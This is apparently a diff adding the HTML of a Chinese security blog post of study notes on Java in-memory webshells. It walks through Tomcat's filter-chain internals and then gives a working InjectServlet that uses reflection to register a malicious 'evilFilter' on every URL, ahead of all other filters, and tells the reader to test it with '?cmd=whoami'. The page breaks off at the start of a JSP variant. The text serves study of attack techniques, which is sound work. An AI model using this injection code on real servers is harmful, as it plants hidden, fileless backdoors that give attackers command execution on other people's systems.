@@ -1,0 +1,1053 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>Java内存马 - Zimo's Blogs</title>
+
+  
+    <meta name="description" content="Java内存马本文简述作者在学习 Java 内存马中的心得与体会。 Tomcat &amp; ServletTomcat 是一个 web 应用服务器，是一个可以容纳 Servlet 的容器，可以把用户的请求发送给 Servlet 这个组件并把 Servlet 的响应返回给用户，Tomcat 中有四类组件：  Engine，实现类为 org.apache.catalina.core.Standard">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java内存马">
+<meta property="og:url" content="https://www.zimo.click/2026/04/08/%E5%86%85%E5%AD%98%E9%A9%AC/">
+<meta property="og:site_name" content="Zimo&#39;s Blogs">
+<meta property="og:description" content="Java内存马本文简述作者在学习 Java 内存马中的心得与体会。 Tomcat &amp; ServletTomcat 是一个 web 应用服务器，是一个可以容纳 Servlet 的容器，可以把用户的请求发送给 Servlet 这个组件并把 Servlet 的响应返回给用户，Tomcat 中有四类组件：  Engine，实现类为 org.apache.catalina.core.Standard">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg">
+<meta property="article:published_time" content="2026-04-08T13:32:03.000Z">
+<meta property="article:modified_time" content="2026-04-08T13:32:03.000Z">
+<meta property="article:author" content="Zimo">
+<meta property="article:tag" content="JAVA安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg">
+  
+  
+  
+  <meta name="keywords" content="JAVA安全">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zimo","sameAs":[],"image":"https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg"},"dateCreated":"2026-04-08T21:32:03+08:00","dateModified":"2026-04-08T21:32:03+08:00","datePublished":"2026-04-08T21:32:03+08:00","description":"","headline":"Java内存马","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.zimo.click/2026/04/08/%E5%86%85%E5%AD%98%E9%A9%AC/"},"publisher":{"@type":"Organization","name":"Zimo","sameAs":[],"image":"https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg","logo":{"@type":"ImageObject","url":"https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg"}},"url":"https://www.zimo.click/2026/04/08/%E5%86%85%E5%AD%98%E9%A9%AC/","keywords":"JAVA安全","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Zimo's Blogs</div><div class="sub cap">Loading...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/04/22/FastJson/"><span class="title">FastJson</span></a><a class="item title" href="/2026/04/08/%E5%86%85%E5%AD%98%E9%A9%AC/"><span class="title">Java内存马</span></a><a class="item title" href="/2026/04/04/ClassLoader/"><span class="title">ClassLoader</span></a><a class="item title" href="/2026/03/31/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/"><span class="title">Java安全漫谈学习笔记</span></a><a class="item title" href="/2026/03/29/CVE-2025-55182/"><span class="title">CVE-2025-55182</span></a><a class="item title" href="/2026/03/29/CAP/"><span class="title">CAP</span></a><a class="item title" href="/2026/03/29/Forgotten/"><span class="title">Forgotten</span></a><a class="item title" href="/2026/03/29/HTTP/"><span class="title">HTTP</span></a><a class="item title" href="/2026/03/29/LakeCTF25-26/"><span class="title">LakeCTF 25-26</span></a><a class="item title" href="/2026/03/29/LilacCTF-2026/"><span class="title">LilacCTF 2026</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-08T13:32:03.000Z">2026-04-08</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-04-08T13:32:03.000Z">2026-04-08</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Java内存马</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="Java内存马"><a href="#Java内存马" class="headerlink" title="Java内存马"></a>Java内存马</h1><p>本文简述作者在学习 Java 内存马中的心得与体会。</p>
+<h2 id="Tomcat-Servlet"><a href="#Tomcat-Servlet" class="headerlink" title="Tomcat &amp; Servlet"></a>Tomcat &amp; Servlet</h2><p>Tomcat 是一个 web 应用服务器，是一个可以容纳 <code>Servlet</code> 的容器，可以把用户的请求发送给 <code>Servlet</code> 这个组件并把 <code>Servlet</code> 的响应返回给用户，Tomcat 中有四类组件：</p>
+<ol>
+<li>Engine，实现类为 <code>org.apache.catalina.core.StandardEngine</code></li>
+<li>Host，实现类为 <code>org.apache.catalina.core.StandardHost</code></li>
+<li>Context，实现类为 <code>org.apache.catalina.core.StandardContext</code></li>
+<li>Wrapper，实现类为 <code>org.apache.catalina.core.StandardWrapper</code></li>
+</ol>
+<p>可以理解为 Tomcat 收到请求后，通过 <code>Tomcat</code> 转发给 <code>HOST</code>，在进一步的根据后缀不同转发到不同的 <code>Context</code>，而后再转发给不同的 <code>Wrapper</code> ，而每个 <code>Wrapper</code> 实例就具体表示着一个 <code>Servlet</code> 定义（<code>StandardWrapper</code> 的主要任务就是载入Servlet类并且进行实例化）。</p>
+<h2 id="内存马初探"><a href="#内存马初探" class="headerlink" title="内存马初探"></a>内存马初探</h2><p>由于现在防护措施越来越多，Upload 文件 shell 已经成为极易于检测的手段，内存马学习就显得尤为的重要。</p>
+<p>内存马的分类：</p>
+<ol>
+<li><p>servlet api 类</p>
+<ul>
+<li>filter 类</li>
+<li>servlet 类</li>
+</ul>
+</li>
+<li><p>spring 框架类</p>
+<ul>
+<li>拦截器</li>
+<li>controller</li>
+</ul>
+</li>
+<li><p>Java Instrumentation 类</p>
+<ul>
+<li>agent</li>
+</ul>
+</li>
+</ol>
+<h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Filter 就很类似于我们在 python 内存马中所提到的 before_request &amp; after_request，本质用途是进行一次大接口统一的 filter，以应对类似于统一的过滤和检查。</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404163846396.png" alt="image-20260404163846396"></p>
+<p>我们很容易想到 filter 的作用就是在 servlet 前去过滤，那么我们如果能动态创建 filter 并执行恶意代码，就打下了所谓的内存马。</p>
+<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>我们写一个 filter demo：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[FilterDemo] init() - Filter 初始化创建&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[FilterDemo] Filter Name: &quot;</span> + filterConfig.getFilterName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[FilterDemo] doFilter() - 请求进来了，执行过滤操作&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[FilterDemo] 远程地址: &quot;</span> + request.getRemoteAddr());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键：调用 chain.doFilter() 才会把请求传递给下一个 Filter 或 Servlet</span></span><br><span class="line">        <span class="comment">// 如果注释掉这行，请求就被拦截了，Servlet 收不到请求</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[FilterDemo] doFilter() - Servlet 处理完了，响应回来了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[FilterDemo] destroy() - Filter 被销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并在 web.xml 中注册 filter：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.tomcatdemo.FilterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先梳理一下后面会遇到的几个东西：</p>
+<p><strong>FilterDefs</strong>：存放 <code>FilterDef</code> 的数组 ，<code>FilterDef</code> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p>
+<p><strong>FilterConfigs</strong>：存放 <code>filterConfig</code> 的数组，在 <code>FilterConfig</code> 中主要存放 <code>FilterDef</code> 和 <code>Filter</code> 对象等信息</p>
+<p><strong>FilterMaps</strong>：存放 <code>FilterMap</code> 的数组，在 <code>FilterMap</code> 中主要存放了 <code>FilterName</code> 和 对应的<code>URLPattern</code></p>
+<p><strong>FilterChain</strong>：过滤器链，该对象上的 <code>doFilter</code> 方法能依次调用链上的 Filter</p>
+<p><strong>WebXml</strong>：存放 web.xml 中内容的类</p>
+<p><strong>ContextConfig</strong>：Web应用的上下文配置类</p>
+<p><strong>StandardContext</strong>：<code>Context</code> 接口的标准实现类，一个 <code>Context</code> 代表一个 Web 应用，其下可以包含<strong>多个</strong> <code>Wrapper</code></p>
+<p><strong>StandardWrapperValve</strong>：一个 <code>Wrapper</code> 的标准实现类，一个 <code>Wrapper</code> 代表一个 <code>Servlet</code></p>
+<p>首先会通过 <code>ConfigureContext</code> 解析 web.xml 并返回一个 webXml 实例，重点还是在于创建 filterChain：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404165118781.png" alt="image-20260404165118781"></p>
+<p>这里他就创建 filter chain，我们跟进这个方法：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404165208258.png" alt="image-20260404165208258"></p>
+<p>这里就是调用 <code>wrapper.getParent</code> 从 wrapper 获取到 context，然后再从 context 中获取到 FilterMaps，</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404165433982.png" alt="image-20260404165433982"></p>
+<p>这里可以看到 <code>FilterMaps</code> 中存放着 filterName 和 urlPattern，然后我们再往下走</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404170134107.png" alt="image-20260404170134107"></p>
+<p>发现这里会遍历 FilterMaps 中的 FilterMap，如果当前请求的 url 和 <code>FilterMap</code> 中的 <code>URLPattern</code> 相匹配，就会进入 if 判断调用 context.findFilterConfig 方法在 <code>FilterConfigs</code> 中寻找对应 <code>FilterName</code> 的 <code>FilterConfig</code>，如果不为空那么就 <code>filterChain.addFilter(filterConfig)</code>。</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404170319509.png" alt="image-20260404170319509"></p>
+<p>这个函数就比较简单了，就是一个去重 &amp; 添加的过程。</p>
+<p>这样的话 <code>FilterChain</code> 就完成了，回到 <code>StandardWrapperValve</code> 这个类中，调用 <code>FilterChain#doFilter</code>  方法.</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404170522352.png" alt="image-20260404170522352"></p>
+<p>这个方法其实就是去取出 <code>filter</code> 然后顺次调用 <code>filter#doFilter</code> 方法：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260404170711618.png" alt="image-20260404170711618"></p>
+<p>虽然这里记录了 <code>pos</code> 但是实际上不是 <code>while</code> 循环，<code>pos</code> 只是为了记录目前在哪方便回退的时候也调用 <code>filter</code> （根据之前的图）。</p>
+<p>做个总结：</p>
+<p>通过 <code>URL</code> 从 <code>FilterMaps</code> 中找出与 URL 相对应的 <code>Filter</code> 名称，然后根据 <code>Filter</code> 名称去 <code>FilterConfigs</code> 中寻找对应名称的 <code>FilterConfig</code>，添加到 <code>FilterChiain</code> 中。</p>
+<p><code>FilterChain</code> 调用 <code>internalDoFilter</code> 遍历获取 <code>FilterConfig</code>，通过 <code>FilterConfig#getFilter</code> 获取 <code>Filter</code> 并调用 <code>Filter#doFilter</code> 方法。</p>
+<p>根据上面的总结，不难发现最开始是从 context 中获取 FilterMaps 并顺次调用，那我们可以创建一个 <code>FilterMap</code> 放在数组最前面，匹配的时候就能找到对应的 <code>FilterName.FilterConfig</code> ，添加到 Chain 中，触发shell。</p>
+<h3 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h3><p>刚才说了需要创建一个 <code>FilterMap</code> 插到 <code>FilterMaps</code> 最前面，那我们先看看怎么获取到的 <code>FilterMaps</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilterMap[] filterMaps = context.findFilterMaps();</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过这段代码获取到 Standardcontext。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) ppctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
+
+<p>原理就是 Tomcat 其实是采用了 Facade Pattern，外壳是普通 Java 公开的接口，内核才是 servlet 实现的时候具体的接口，而中间是采用着私有变量的形式组合起来的。</p>
+<p>获取了 Context 后，我们可以通过修改 Context 的 <code>FilterConfigs</code>、<code>filterDefs</code>、<code>filterMaps</code>，来注入内存马。</p>
+<p>流程如下：</p>
+<ol>
+<li>创建一个恶意 Filter</li>
+<li>利用 FilterDef 对 Filter 进行一个封装</li>
+<li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li>
+<li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li>
+</ol>
+<p>Code：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatdemo.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.DispatcherType;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ① 反射拿到 StandardContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getServletContext();</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> appContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(appContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ② 定义 FilterDef</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;evilFilter&quot;</span>;</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilterName(filterName);</span><br><span class="line">            filterDef.setFilterClass(EvilFilter.class.getName());</span><br><span class="line">            filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">EvilFilter</span>());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ③ 定义 FilterMap，拦截所有请求，插到最前面</span></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.setFilterName(filterName);</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ④ 反射创建 ApplicationFilterConfig 并放入 filterConfigs</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">configsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            configsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Map&lt;String, Object&gt; filterConfigs = (Map&lt;String, Object&gt;) configsField.get(standardContext);</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; filterConfigClass = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterConfig</span> <span class="operator">=</span> constructor.newInstance(standardContext, filterDef);</span><br><span class="line">            filterConfigs.put(filterName, filterConfig);</span><br><span class="line"></span><br><span class="line">            out.println(<span class="string">&quot;[+] 内存马注入成功！&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;[+] 测试: 访问任意路径加 ?cmd=whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;[-] 注入失败: &quot;</span> + e.getMessage());</span><br><span class="line">            e.printStackTrace(out);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center"><strong>名称</strong></th>
+<th align="center"><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>FilterDef</strong></td>
+<td align="center"><strong>定义</strong>。记录 Filter 的基本信息和实例。</td>
+</tr>
+<tr>
+<td align="center"><strong>FilterMap</strong></td>
+<td align="center"><strong>路由</strong>。记录哪些 URL 路径要经过这个 Filter。</td>
+</tr>
+<tr>
+<td align="center"><strong>FilterConfig</strong></td>
+<td align="center"><strong>运行时状态</strong>。将定义好的 Filter 真正激活。</td>
+</tr>
+</tbody></table>
+<p>jsp：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 